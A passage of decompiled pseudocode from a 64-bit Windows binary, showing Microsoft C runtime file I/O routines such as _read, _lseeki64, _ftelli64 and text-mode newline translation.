  if ( !ReadFile(*(HANDLE *)(v14 + 72LL * (v8 & 0x3F) + 40), Buffer, 0x1000u, &NumberOfBytesRead, nullptr)
    || common_lseek<__int64>(v8, a2, 0, a3) < 0
    || v12 > NumberOfBytesRead )
  {
    return -1;
  }
  v15 = &Buffer[NumberOfBytesRead];
  v16 = Buffer;
  if ( v12 != 0 )
  {
    do
    {
      if ( v16 >= v15 )
        break;
      if ( *v16 == 13 )
      {
        if ( v16 < v15 - 1 && v16[1] == 10 )
          ++v16;
      }
      else
      {
        v16 += byte_14009ED10[*v16];
      }
      ++v7;
      ++v16;
    }
    while ( v7 != v12 );
  }
  return v16 - Buffer + v13;
}


// ----- ?count_newline_bytes@@YA_JQEBD0W4__crt_lowio_text_mode@@@Z @ 0x14001f580 -----
__int64 __fastcall count_newline_bytes(_BYTE *a1, _BYTE *a2, char a3)
{
  _BYTE *v3; // r9
  __int64 v4; // r8
  __int64 v5; // rax
  __int64 v7; // r8
  __int64 v8; // rcx

  v3 = a1;
  if ( (unsigned __int8)(a3 - 1) > 1u )
  {
    v7 = 0;
    if ( a1 != a2 )
    {
      do
      {
        v8 = v7 + 1;
        if ( *v3 != 10 )
          v8 = v7;
        ++v3;
        v7 = v8;
      }
      while ( v3 != a2 );
    }
    return v7;
  }
  else
  {
    v4 = 0;
    if ( a1 != a2 )
    {
      do
      {
        v5 = v4 + 1;
        if ( *(_WORD *)v3 != 10 )
          v5 = v4;
        v3 += 2;
        v4 = v5;
      }
      while ( v3 != a2 );
    }
    return 2 * v4;
  }
}


// ----- _ftelli64 @ 0x14001f5d8 -----
__int64 __cdecl ftelli64(FILE *Stream)
{
  __int64 v1; // rdi
  int v2; // ebx
  int v3; // ebx
  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF
  char v6; // [rsp+30h] [rbp-30h]
  __int128 v7; // [rsp+38h] [rbp-28h]
  char v8; // [rsp+48h] [rbp-18h]
  int v9; // [rsp+4Ch] [rbp-14h]
  char v10; // [rsp+50h] [rbp-10h]
  int v11; // [rsp+54h] [rbp-Ch]
  char v12; // [rsp+58h] [rbp-8h]

  v5[0] = 0;
  v6 = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v8 = 1;
    v7 = *(_OWORD *)&off_14009ECA8;
  }
  v1 = common_ftell<__int64>(Stream, (__int64)v5);
  if ( v8 == 2 )
    *(_DWORD *)(v5[0] + 936LL) &= ~2u;
  if ( v10 != 0 )
  {
    v2 = v9;
    *(_DWORD *)(unknown_libname_79((__int64)v5) + 32) = v2;
  }
  if ( v12 != 0 )
  {
    v3 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v5) + 36) = v3;
  }
  return v1;
}


// ----- j_??$common_ftell_nolock@_J@@YA_JV__crt_stdio_stream@@AEAV__crt_cached_ptd_host@@@Z @ 0x14001f674 -----
// attributes: thunk
__int64 __fastcall common_ftell_nolock<__int64>(FILE *a1, __int64 a2)
{
  return ??$common_ftell_nolock@_J@@YA_JV__crt_stdio_stream@@AEAV__crt_cached_ptd_host@@@Z(a1, a2);
}


// ----- ??$write_buffer_nolock@D@@YA_NDV__crt_stdio_stream@@AEAV__crt_cached_ptd_host@@@Z @ 0x14001f67c -----
bool __fastcall write_buffer_nolock<char>(char a1, __int64 a2, __int64 a3)
{
  int v5; // eax
  int v6; // ebp
  __int64 v7; // rdx
  signed int v8; // edi
  bool v9; // zf
  _BYTE *v10; // rdx
  char v12; // [rsp+30h] [rbp+8h] BYREF

  v12 = a1;
  v5 = fileno((FILE *)a2);
  if ( (*(_DWORD *)(a2 + 20) & 0xC0) == 0 )
    return (unsigned int)write_internal(v5, (__int64)&v12, 1u, a3) == 1;
  v6 = 0;
  v7 = *(_QWORD *)(a2 + 8);
  v8 = *(_DWORD *)a2 - *(_DWORD *)(a2 + 8);
  *(_QWORD *)a2 = v7 + 1;
  *(_DWORD *)(a2 + 16) = *(_DWORD *)(a2 + 32) - 1;
  if ( v8 <= 0 )
  {
    if ( (unsigned int)(v5 + 2) <= 1 )
      v10 = &unk_14009ECC0;
    else
      v10 = (_BYTE *)(qword_1400A0680[(__int64)v5 >> 6] + 72LL * (v5 & 0x3F));
    if ( (v10[56] & 0x20) != 0 && lseeki64(v5, 0, 2) == -1 )
    {
      _InterlockedOr((volatile signed __int32 *)(a2 + 20), 0x10u);
      return true;
    }
  }
  else
  {
    v6 = write_internal(v5, v7, v8, a3);
  }
  v9 = v6 == v8;
  **(_BYTE **)(a2 + 8) = v12;
  return v9;
}


// ----- sub_14001F774 @ 0x14001f774 -----
bool __fastcall sub_14001F774(__int64 a1)
{
  void *osfhandle; // rax
  void *v3; // rbx
  LARGE_INTEGER FileSize; // [rsp+30h] [rbp+8h] BYREF
  LARGE_INTEGER NewFilePointer; // [rsp+38h] [rbp+10h] BYREF

  if ( (*(_DWORD *)(a1 + 20) & 8) != 0 )
    return true;
  if ( (*(_DWORD *)(a1 + 20) & 0xC0) != 0 && *(_QWORD *)a1 == *(_QWORD *)(a1 + 8) )
    return false;
  osfhandle = (void *)get_osfhandle(*(_DWORD *)(a1 + 24));
  v3 = osfhandle;
  if ( osfhandle == (void *)-1LL )
    return false;
  NewFilePointer.QuadPart = 0;
  if ( !SetFilePointerEx(osfhandle, 0, &NewFilePointer, 1u) )
    return false;
  FileSize.QuadPart = 0;
  if ( !GetFileSizeEx(v3, &FileSize) )
    return false;
  return NewFilePointer.QuadPart == FileSize.QuadPart;
}


// ----- unknown_libname_85 @ 0x14001f7fc -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_85(unsigned __int8 a1, __int64 a2, __int64 a3)
{
  bool v7; // al

  fileno((FILE *)a2);
  if ( (*(_DWORD *)(a2 + 20) & 6) == 0 )
  {
    *(_DWORD *)(a3 + 44) = 9;
LABEL_3:
    *(_BYTE *)(a3 + 48) = 1;
LABEL_4:
    _InterlockedOr((volatile signed __int32 *)(a2 + 20), 0x10u);
    return 0xFFFFFFFFLL;
  }
  if ( (*(_DWORD *)(a2 + 20) & 0x1000) != 0 )
  {
    *(_DWORD *)(a3 + 44) = 34;
    goto LABEL_3;
  }
  if ( (*(_DWORD *)(a2 + 20) & 1) != 0 )
  {
    v7 = sub_14001F774(a2);
    *(_DWORD *)(a2 + 16) = 0;
    if ( !v7 )
      goto LABEL_4;
    *(_QWORD *)a2 = *(_QWORD *)(a2 + 8);
    _InterlockedAnd((volatile signed __int32 *)(a2 + 20), 0xFFFFFFFE);
  }
  _InterlockedOr((volatile signed __int32 *)(a2 + 20), 2u);
  _InterlockedAnd((volatile signed __int32 *)(a2 + 20), 0xFFFFFFF7);
  *(_DWORD *)(a2 + 16) = 0;
  if ( (*(_DWORD *)(a2 + 20) & 0x4C0) == 0 && (unsigned __int8)_acrt_should_use_temporary_buffer((FILE *)a2) == 0 )
    _acrt_stdio_allocate_buffer_nolock(a2);
  if ( !write_buffer_nolock<char>(a1, a2, a3) )
    goto LABEL_4;
  return a1;
}


// ----- sub_14001F8C8 @ 0x14001f8c8 -----
__int64 __fastcall sub_14001F8C8(int a1, __int16 *a2, __int64 a3)
{
  __int64 v3; // r15
  __int64 v4; // rdi
  __int64 v5; // r12
  __int64 v7; // rbp
  __int64 v8; // rax
  void *v9; // r10
  __int16 *v10; // r8
  __int16 *v11; // rax
  __int16 *v12; // rbx
  __int16 v13; // dx
  __int16 *v14; // rcx
  __int64 v15; // rcx
  char v16; // al
  __int16 Buffer; // [rsp+70h] [rbp+8h] BYREF
  __int16 v19; // [rsp+78h] [rbp+10h]
  DWORD NumberOfBytesRead; // [rsp+80h] [rbp+18h] BYREF

  v3 = a1;
  v4 = 0;
  v5 = (__int64)a1 >> 6;
  v7 = 9LL * (a1 & 0x3F);
  v8 = qword_1400A0680[v5];
  v9 = *(void **)(v8 + 72LL * (a1 & 0x3F) + 40);
  if ( a3 != 0 && *a2 == 10 )
    *(_BYTE *)(v8 + 72LL * (a1 & 0x3F) + 56) |= 4u;
  else
    *(_BYTE *)(v8 + 72LL * (a1 & 0x3F) + 56) &= ~4u;
  v10 = &a2[a3];
  v11 = a2;
  v12 = a2;
  if ( a2 >= v10 )
    return 2 * (unsigned int)(v12 - a2);
  while ( 1 )
  {
    v13 = *v11;
    if ( *v11 == 26 )
    {
      v15 = qword_1400A0680[v3 >> 6];
      v16 = *(_BYTE *)(v15 + 72 * (v3 & 0x3F) + 56);
      if ( (v16 & 0x40) == 0 )
      {
        *(_BYTE *)(v15 + 72 * (v3 & 0x3F) + 56) = v16 | 2;
        return 2 * (unsigned int)(v12 - a2);
      }
      *v12 = 26;
      return 2 * (unsigned int)(++v12 - a2);
    }
    v14 = v11 + 1;
    if ( v13 != 13 )
    {
LABEL_11:
      ++v11;
      goto LABEL_12;
    }
    if ( v14 >= v10 )
      break;
    if ( *v14 != 10 )
      goto LABEL_11;
    v11 += 2;
    v13 = 10;
LABEL_12:
    *v12++ = v13;
    if ( v11 >= v10 )
      return 2 * (unsigned int)(v12 - a2);
  }
  Buffer = 0;
  NumberOfBytesRead = 0;
  if ( !ReadFile(v9, &Buffer, 2u, &NumberOfBytesRead, nullptr) || NumberOfBytesRead == 0 )
  {
LABEL_25:
    *v12 = 13;
    return 2 * (unsigned int)(++v12 - a2);
  }
  if ( (*(_BYTE *)(qword_1400A0680[v5] + 8 * v7 + 56) & 0x48) == 0 )
  {
    if ( Buffer == 10 && v12 == a2 )
      goto LABEL_18;
    lseeki64_nolock((unsigned int)v3, -2, 1);
    if ( Buffer == 10 )
      return 2 * (unsigned int)(v12 - a2);
    goto LABEL_25;
  }
  if ( Buffer == 10 )
  {
LABEL_18:
    *v12 = 10;
    return 2 * (unsigned int)(++v12 - a2);
  }
  v19 = Buffer;
  *v12 = 13;
  do
  {
    *(_BYTE *)(qword_1400A0680[v3 >> 6] + 72 * (v3 & 0x3F) + v4 + 58) = *((_BYTE *)&v19 + v4);
    ++v4;
  }
  while ( v4 < 2 );
  *(_BYTE *)(qword_1400A0680[v3 >> 6] + 72 * (v3 & 0x3F) + 60) = 10;
  return 2 * (unsigned int)(++v12 - a2);
}


// ----- sub_14001FAC4 @ 0x14001fac4 -----
__int64 __fastcall sub_14001FAC4(int a1, unsigned __int8 *a2, __int64 a3)
{
  __int64 v3; // rbp
  __int64 v4; // r15
  __int64 v5; // r14
  __int64 v7; // rax
  void *v8; // r10
  unsigned __int8 *v9; // r9
  unsigned __int8 *v10; // rax
  unsigned __int8 *v11; // rbx
  unsigned __int8 v12; // cl
  unsigned __int8 *v13; // rdx
  char v14; // cl
  __int64 v15; // r8
  char v16; // al
  unsigned int v17; // ebx
  unsigned __int8 *v19; // rcx
  char *v20; // rbx
  unsigned int i; // r8d
  __int64 v22; // rdx
  __int64 v23; // r9
  char v24; // dl
  char v25; // dl
  int v26; // ebx
  int v27; // r9d
  DWORD LastError; // eax
  char Buffer; // [rsp+70h] [rbp+8h] BYREF
  DWORD NumberOfBytesRead; // [rsp+78h] [rbp+10h] BYREF

  v3 = a1;
  v4 = (__int64)a1 >> 6;
  v5 = a1 & 0x3F;
  v7 = qword_1400A0680[v4];
  v8 = *(void **)(v7 + 72 * v5 + 40);
  if ( a3 != 0 && *a2 == 10 )
    *(_BYTE *)(v7 + 72 * v5 + 56) |= 4u;
  else
    *(_BYTE *)(v7 + 72 * v5 + 56) &= ~4u;
  v9 = &a2[a3];
  v10 = a2;
  v11 = a2;
  if ( a2 >= &a2[a3] )
    goto LABEL_29;
  while ( 1 )
  {
    v12 = *v10;
    if ( *v10 == 26 )
    {
      v15 = qword_1400A0680[v4];
      v16 = *(_BYTE *)(v15 + 72 * v5 + 56);
      if ( (v16 & 0x40) == 0 )
      {
        *(_BYTE *)(v15 + 72 * v5 + 56) = v16 | 2;
        goto LABEL_29;
      }
      *v11 = 26;
      goto LABEL_28;
    }
    v13 = v10 + 1;
    if ( v12 != 13 )
    {
LABEL_11:
      *v11 = v12;
      ++v10;
      goto LABEL_12;
    }
    if ( v13 >= v9 )
      break;
    if ( *v13 != 10 )
      goto LABEL_11;
    v10 += 2;
    *v11 = 10;
LABEL_12:
    ++v11;
    if ( v10 >= v9 )
      goto LABEL_29;
  }
  Buffer = 0;
  NumberOfBytesRead = 0;
  if ( ReadFile(v8, &Buffer, 1u, &NumberOfBytesRead, nullptr) && NumberOfBytesRead != 0 )
  {
    if ( (*(_BYTE *)(qword_1400A0680[v4] + 72 * v5 + 56) & 0x48) != 0 )
    {
      v14 = Buffer;
      if ( Buffer == 10 )
      {
LABEL_18:
        *v11 = 10;
        goto LABEL_28;
      }
      *v11 = 13;
      *(_BYTE *)(qword_1400A0680[v4] + 72 * v5 + 58) = v14;
    }
    else
    {
      if ( Buffer == 10 && v11 == a2 )
        goto LABEL_18;
      lseeki64_nolock((unsigned int)v3, -1, 1);
      if ( Buffer == 10 )
        goto LABEL_29;
      *v11 = 13;
    }
  }
  else
  {
    *v11 = 13;
  }
LABEL_28:
  LODWORD(v11) = (_DWORD)v11 + 1;
LABEL_29:
  v17 = (_DWORD)v11 - (_DWORD)a2;
  if ( v17 == 0 )
    return 0;
  if ( *(_BYTE *)(qword_1400A0680[v4] + 72 * v5 + 57) == 0 )
    return v17;
  v19 = &a2[v17];
  v20 = (char *)(v19 - 1);
  if ( (*(v19 - 1) & 0x80u) == 0 )
  {
    LODWORD(v20) = (_DWORD)v19;
    goto LABEL_52;
  }
  for ( i = 1; byte_14009ED10[(unsigned __int8)*v20] == 0 && i <= 4 && v20 >= (char *)a2; ++i )
    --v20;
  v22 = (unsigned __int8)*v20;
  if ( byte_14009ED10[v22] == 0 )
  {
    *(_DWORD *)sub_140018888() = 42;
    return 0xFFFFFFFFLL;
  }
  if ( byte_14009ED10[v22] + 1 == i )
  {
    LODWORD(v20) = i + (_DWORD)v20;
  }
  else
  {
    v23 = qword_1400A0680[v3 >> 6];
    if ( (*(_BYTE *)(v23 + 72 * (v3 & 0x3F) + 56) & 0x48) != 0 )
    {
      ++v20;
      *(_BYTE *)(v23 + 72 * (v3 & 0x3F) + 58) = v22;
      if ( i >= 2 )
      {
        v24 = *v20++;
        *(_BYTE *)(qword_1400A0680[v3 >> 6] + 72 * (v3 & 0x3F) + 59) = v24;
      }
      if ( i == 3 )
      {
        v25 = *v20;
        LODWORD(v20) = (_DWORD)v20 + 1;
        *(_BYTE *)(qword_1400A0680[v3 >> 6] + 72 * (v3 & 0x3F) + 60) = v25;
      }
      LODWORD(v20) = (_DWORD)v20 - i;
    }
    else
    {
      lseeki64_nolock((unsigned int)v3, -i, 1);
    }
  }
LABEL_52:
  v26 = (_DWORD)v20 - (_DWORD)a2;
  v27 = sub_140022950(65001, 0, a2);
  if ( v27 != 0 )
  {
    *(_BYTE *)(qword_1400A0680[v3 >> 6] + 72 * (v3 & 0x3F) + 61) = *(_BYTE *)(qword_1400A0680[v3 >> 6]
                                                                            + 72 * (v3 & 0x3F)
                                                                            + 61)
                                                                 & 0xFD
                                                                 | (v26 != v27 ? 2 : 0);
    return (unsigned int)(2 * v27);
  }
  else
  {
    LastError = GetLastError();
    sub_140018818(LastError);
    return 0xFFFFFFFFLL;
  }
}


// ----- _read @ 0x14001fdf4 -----
int __cdecl read(int FileHandle, void *DstBuf, unsigned int MaxCharCount)
{
  BOOL v7; // eax
  __int64 v8; // r15
  int v9; // ebx

  if ( FileHandle == -2 )
  {
    *(_DWORD *)sub_140018864() = 0;
    *(_DWORD *)sub_140018888() = 9;
    return -1;
  }
  v7 = FileHandle >= 0 && FileHandle < (unsigned int)dword_1400A0A80;
  if ( !v7
    || (v8 = (__int64)FileHandle >> 6, (*(_BYTE *)(qword_1400A0680[v8] + 72LL * (FileHandle & 0x3F) + 56) & 1) == 0) )
  {
    *(_DWORD *)sub_140018864() = 0;
    *(_DWORD *)sub_140018888() = 9;
LABEL_10:
    invalid_parameter_noinfo();
    return -1;
  }
  if ( MaxCharCount > 0x7FFFFFFF )
  {
    *(_DWORD *)sub_140018864() = 0;
    *(_DWORD *)sub_140018888() = 22;
    goto LABEL_10;
  }
  _acrt_lowio_lock_fh((unsigned int)FileHandle);
  v9 = -1;
  if ( (*(_BYTE *)(qword_1400A0680[v8] + 72LL * (FileHandle & 0x3F) + 56) & 1) != 0 )
  {
    v9 = sub_14001FF14((unsigned int)FileHandle, DstBuf, MaxCharCount);
  }
  else
  {
    *(_DWORD *)sub_140018888() = 9;
    *(_DWORD *)sub_140018864() = 0;
  }
  _acrt_lowio_unlock_fh((unsigned int)FileHandle);
  return v9;
}


// ----- sub_14001FF14 @ 0x14001ff14 -----
__int64 __fastcall sub_14001FF14(int a1, __int16 *a2, DWORD a3)
{
  unsigned __int64 v5; // r8
  __int64 v6; // rax
  __int16 *v7; // rbx
  int v8; // r10d
  DWORD v9; // ebp
  __int16 *v10; // r15
  __int64 v11; // rax
  __int64 v12; // rax
  int v13; // edi
  char v14; // al
  char v15; // cl
  char v16; // cl
  DWORD LastError; // eax
  int v18; // edi
  unsigned __int64 v20; // rdx
  int v21; // eax
  unsigned __int64 v22; // r8
  __int16 *v23; // r10
  __int16 *v24; // rax
  __int16 *v25; // rdi
  __int16 *v26; // r9
  __int16 v27; // cx
  __int64 v28; // r11
  DWORD Mode; // [rsp+30h] [rbp-68h] BYREF
  HANDLE hConsoleHandle; // [rsp+38h] [rbp-60h]
  unsigned __int64 v31; // [rsp+40h] [rbp-58h]
  __int64 v32; // [rsp+48h] [rbp-50h]
  __int16 *v33; // [rsp+50h] [rbp-48h]
  char v34; // [rsp+A0h] [rbp+8h]
  DWORD NumberOfCharsRead; // [rsp+B8h] [rbp+20h] BYREF

  if ( a1 != -2 )
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_1400A0A80
      && (v32 = 1,
          v5 = (unsigned __int64)a1 >> 6,
          v31 = v5,
          (*(_BYTE *)((v6 = qword_1400A0680[v5]) + 72LL * (a1 & 0x3F) + 56) & 1) != 0) )
    {
      if ( a3 <= 0x7FFFFFFF )
      {
        if ( a3 == 0 || (*(_BYTE *)(v6 + 72LL * (a1 & 0x3F) + 56) & 2) != 0 )
          return 0;
        if ( a2 != nullptr )
        {
          v7 = nullptr;
          v8 = *(char *)(v6 + 72LL * (a1 & 0x3F) + 57);
          hConsoleHandle = *(HANDLE *)(v6 + 72LL * (a1 & 0x3F) + 40);
          v34 = v8;
          if ( v8 == 1 )
          {
            if ( (a3 & 1) != 0 )
            {
LABEL_14:
              *(_DWORD *)sub_140018864() = 0;
              *(_DWORD *)sub_140018888() = 22;
              invalid_parameter_noinfo();
LABEL_39:
              v18 = -1;
              goto LABEL_40;
            }
            v9 = a3 >> 1;
            if ( a3 >> 1 < 4 )
              v9 = 4;
            v7 = (__int16 *)malloc_base(v9);
            free_base(nullptr);
            free_base(nullptr);
            v10 = v7;
            if ( v7 == nullptr )
            {
              *(_DWORD *)sub_140018888() = 12;
              *(_DWORD *)sub_140018864() = 8;
              goto LABEL_39;
            }
            v11 = lseeki64_nolock((unsigned int)a1, 0, 1);
            v5 = v31;
            LOBYTE(v8) = v34;
            *(_QWORD *)(qword_1400A0680[v31] + 72LL * (a1 & 0x3F) + 48) = v11;
          }
          else
          {
            if ( v8 == 2 && (a3 & 1) != 0 )
              goto LABEL_14;
            v9 = a3;
            v10 = a2;
          }
          v12 = qword_1400A0680[v5];
          v13 = 0;
          v33 = v10;
          if ( (*(_BYTE *)(v12 + 72LL * (a1 & 0x3F) + 56) & 0x48) != 0 )
          {
            v14 = *(_BYTE *)(v12 + 72LL * (a1 & 0x3F) + 58);
            if ( v14 != 10 && v9 != 0 )
            {
              *(_BYTE *)v10 = v14;
              --v9;
              v10 = (__int16 *)((char *)v10 + 1);
              v13 = 1;
              *(_BYTE *)(qword_1400A0680[v5] + 72LL * (a1 & 0x3F) + 58) = 10;
              if ( (_BYTE)v8 != 0 )
              {
                v15 = *(_BYTE *)(qword_1400A0680[v5] + 72LL * (a1 & 0x3F) + 59);
                if ( v15 != 10 && v9 != 0 )
                {
                  *(_BYTE *)v10 = v15;
                  v13 = 2;
                  v10 = (__int16 *)((char *)v10 + 1);
                  --v9;
                  *(_BYTE *)(qword_1400A0680[v5] + 72LL * (a1 & 0x3F) + 59) = 10;
                  if ( (_BYTE)v8 == 1 )
                  {
                    v16 = *(_BYTE *)(qword_1400A0680[v5] + 72LL * (a1 & 0x3F) + 60);
                    if ( v16 != 10 && v9 != 0 )
                    {
                      *(_BYTE *)v10 = v16;
                      v13 = 3;
                      v10 = (__int16 *)((char *)v10 + 1);
                      --v9;
                      *(_BYTE *)(qword_1400A0680[v5] + 72LL * (a1 & 0x3F) + 60) = 10;
                    }
                  }
                }
              }
            }
          }
          Mode = 0;
          if ( isatty(a1) != 0
            && *(char *)(qword_1400A0680[v31] + 72LL * (a1 & 0x3F) + 56) < 0
            && GetConsoleMode(hConsoleHandle, &Mode) )
          {
            if ( v34 == 2 )
            {
              NumberOfCharsRead = 0;
              if ( !ReadConsoleW(hConsoleHandle, v10, v9 >> 1, &NumberOfCharsRead, nullptr) )
              {
                LastError = GetLastError();
LABEL_38:
                sub_140018818(LastError);
                goto LABEL_39;
              }
              v18 = v13 + 2 * NumberOfCharsRead;
              goto LABEL_46;
            }
          }
          else
          {
            LOBYTE(v32) = 0;
          }
          NumberOfCharsRead = 0;
          if ( !ReadFile(hConsoleHandle, v10, v9, &NumberOfCharsRead, nullptr) || NumberOfCharsRead > a3 )
          {
            LastError = GetLastError();
            if ( LastError == 5 )
            {
              *(_DWORD *)sub_140018888() = 9;
              *(_DWORD *)sub_140018864() = 5;
              goto LABEL_39;
            }
            if ( LastError == 109 )
            {
              v18 = 0;
              goto LABEL_40;
            }
            goto LABEL_38;
          }
          v18 = NumberOfCharsRead + v13;
LABEL_46:
          v20 = v31;
          if ( *(char *)(qword_1400A0680[v31] + 72LL * (a1 & 0x3F) + 56) < 0 )
          {
            if ( v34 == 2 )
            {
              v22 = (unsigned __int64)v18 >> 1;
              if ( (_BYTE)v32 != 0 )
              {
                v23 = v33;
                v24 = v33;
                v25 = v33;
                v26 = &v33[v22];
                if ( v33 < v26 )
                {
                  while ( 1 )
                  {
                    v27 = *v24;
                    if ( *v24 == 26 )
                      break;
                    if ( v27 == 13 && v24 + 1 < v26 && v24[1] == 10 )
                    {
                      v27 = 10;
                      v28 = 4;
                    }
                    else
                    {
                      v28 = 2;
                    }
                    v24 = (__int16 *)((char *)v24 + v28);
                    *v25++ = v27;
                    if ( v24 >= v26 )
                      goto LABEL_61;
                  }
                  *(_BYTE *)(qword_1400A0680[v20] + 72LL * (a1 & 0x3F) + 56) |= 2u;
                }
LABEL_61:
                v18 = 2 * (v25 - v23);
                goto LABEL_40;
              }
              v21 = sub_14001F8C8(a1, v33, v22);
            }
            else
            {
              v21 = sub_14001FAC4(a1, (unsigned __int8 *)v10, v18);
            }
            v18 = v21;
          }
LABEL_40:
          free_base(v7);
          return (unsigned int)v18;
        }
      }
      *(_DWORD *)sub_140018864() = 0;
      *(_DWORD *)sub_140018888() = 22;
    }
    else
    {
      *(_DWORD *)sub_140018864() = 0;
      *(_DWORD *)sub_140018888() = 9;
    }
    invalid_parameter_noinfo();
    return 0xFFFFFFFFLL;
  }
  *(_DWORD *)sub_140018864() = 0;
  *(_DWORD *)sub_140018888() = 9;
  return 0xFFFFFFFFLL;
}


// ----- ??$common_lseek@_J@@YA_JH_JHAEAV__crt_cached_ptd_host@@@Z @ 0x140020374 -----
__int64 __fastcall common_lseek<__int64>(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4)
{
  BOOL v8; // eax
  __int64 v9; // r15
  __int64 v10; // r14

  if ( a1 == -2 )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    return -1;
  }
  v8 = (a1 & 0x80000000) == 0 && a1 < dword_1400A0A80;
  if ( !v8 || (v9 = (__int64)(int)a1 >> 6, (*(_BYTE *)(qword_1400A0680[v9] + 72LL * (a1 & 0x3F) + 56) & 1) == 0) )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a4);
    return -1;
  }
  _acrt_lowio_lock_fh(a1);
  v10 = -1;
  if ( (*(_BYTE *)(qword_1400A0680[v9] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )
  {
    v10 = common_lseek_nolock<__int64>(a1, a2, a3, a4);
  }
  else
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
  }
  _acrt_lowio_unlock_fh(a1);
  return v10;
}


// ----- ??$common_lseek_nolock@_J@@YA_JH_JHAEAV__crt_cached_ptd_host@@@Z @ 0x140020494 -----
LARGE_INTEGER __fastcall common_lseek_nolock<__int64>(int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4)
{
  __int64 v4; // rdi
  void *osfhandle; // rax
  LARGE_INTEGER result; // rax
  DWORD LastError; // eax
  LARGE_INTEGER NewFilePointer; // [rsp+20h] [rbp-18h] BYREF

  v4 = a1;
  osfhandle = (void *)get_osfhandle(a1);
  if ( osfhandle == (void *)-1LL )
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    return (LARGE_INTEGER)-1LL;
  }
  NewFilePointer.QuadPart = 0;
  if ( !SetFilePointerEx(osfhandle, a2, &NewFilePointer, a3) )
  {
    LastError = GetLastError();
    _acrt_errno_map_os_error_ptd(LastError, a4);
    return (LARGE_INTEGER)-1LL;
  }
  result = NewFilePointer;
  if ( NewFilePointer.QuadPart == -1 )
    return (LARGE_INTEGER)-1LL;
  *(_BYTE *)(qword_1400A0680[v4 >> 6] + 72 * (v4 & 0x3F) + 56) &= ~2u;
  return result;
}


// ----- _lseeki64 @ 0x140020544 -----
__int64 __cdecl lseeki64(int FileHandle, __int64 Offset, int Origin)
{
  __int64 v3; // rdi
  int v4; // ebx
  int v5; // ebx
  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_14009ECA8;
  }
  v3 = common_lseek<__int64>(FileHandle, Offset, Origin, (__int64)v7);
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 36) = v5;
  }
  return v3;
}


// ----- j_??$common_lseek@_J@@YA_JH_JHAEAV__crt_cached_ptd_host@@@Z @ 0x1400205e0 -----
// attributes: thunk
__int64 __fastcall common_lseek<__int64>(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4)
{
  return ??$common_lseek@_J@@YA_JH_JHAEAV__crt_cached_ptd_host@@@Z(a1, a2, a3, a4);
}


// ----- _lseeki64_nolock @ 0x1400205e8 -----
LARGE_INTEGER __fastcall lseeki64_nolock(int a1, LARGE_INTEGER a2, DWORD a3)
{
  LARGE_INTEGER v3; // rdi
  int v4; // ebx
  int v5; // ebx
  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_14009ECA8;
  }
  v3 = common_lseek_nolock<__int64>(a1, a2, a3, (__int64)v7);
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 36) = v5;
  }
  return v3;
}


// ----- j_??$common_lseek_nolock@_J@@YA_JH_JHAEAV__crt_cached_ptd_host@@@Z @ 0x140020684 -----
// attributes: thunk
LARGE_INTEGER __fastcall common_lseek_nolock<__int64>(int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4)
{
  return ??$common_lseek_nolock@_J@@YA_JH_JHAEAV__crt_cached_ptd_host@@@Z(a1, a2, a3, a4);
}


// ----- __acrt_should_use_temporary_buffer @ 0x14002068c -----
bool __fastcall _acrt_should_use_temporary_buffer(FILE *Stream)
{
  int v2; // eax

  if ( Stream == _acrt_iob_func(2u) )
    return true;
  if ( Stream != _acrt_iob_func(1u) )
    return false;
  v2 = fileno(Stream);
  return isatty(v2) != 0;
}


